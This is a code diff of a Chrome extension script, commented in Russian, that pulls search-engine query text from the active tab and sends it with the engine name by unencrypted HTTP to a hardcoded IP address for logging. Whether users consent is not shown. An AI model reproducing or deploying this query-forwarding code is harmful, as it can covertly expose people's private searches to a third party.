@@ -7,7 +7,7 @@ function checkURLAffiliation(arr, val) {
 }
 async function sendHTTPrequest(data) {
   const url = `http://84.201.152.151:8023/log?url=${encodeURIComponent(data)}`;
-  const promise =  await fetch(url)
+  const promise = await fetch(url)
 }
 
 chrome.runtime.onInstalled.addListener(() => {
@@ -18,19 +18,24 @@ chrome.runtime.onInstalled.addListener(() => {
 function parseUrl(tabURL) {
   const url = new URL(tabURL);
 
-  const regexp = /(?<=text\=|q\=)([^\&]*)/;
-  const text = regexp.exec(url.search);
-  const isSearcher = checkURLAffiliation(searcherList,url.hostname)  
-  const isWhite = checkURLAffiliation(whiteList,url.hostname)  
-  
+  const isSearcher = checkURLAffiliation(searcherList, url.hostname)
+  const isWhite = checkURLAffiliation(whiteList, url.hostname)
+
   if (isSearcher) {
-  if (!url.search) return
-    const hostname = url.hostname.replace(/.+\/\/|www.|\..+/g, ''); 
+    const hostname = url.hostname.replace(/.+\/\/|www.|\..+/g, '');
+
+    let text;
+    const searchParams = new URLSearchParams(url.search)
+    for (let p of searchParams) {
+      if (p[0] === "q" || p[0] === "text") { text = p[1]};
+    }
+    if (!text) return
+
     const status = url.search.includes(`suggest_req`)
     if (!status) {
       // console.log("Запрос в поисковик", hostname);
-      console.log("Данные для отправки: ", `${hostname}+${decodeURI(text[0])}`);
-      sendHTTPrequest(`${hostname}+${(text[0])}`)
+      console.log(`Данные для отправки: ${hostname} ${decodeURI(text)}`);
+      sendHTTPrequest(`${hostname} ${text}`)
     }
   } else if (isWhite) {
     // console.log("Переход на страницу из белого списка")
@@ -44,7 +49,12 @@ function sendUrl() {
     var tabURL = tabs[0].url;
     chrome.storage.local.get(['online'], function (result) {
       online = result.online
-      if (online) parseUrl(tabURL);
+      try{
+           if (online ){ parseUrl(tabURL)};
+      }
+      catch{
+        // переход на новую вкладку 
+      }
     })
   })
 }
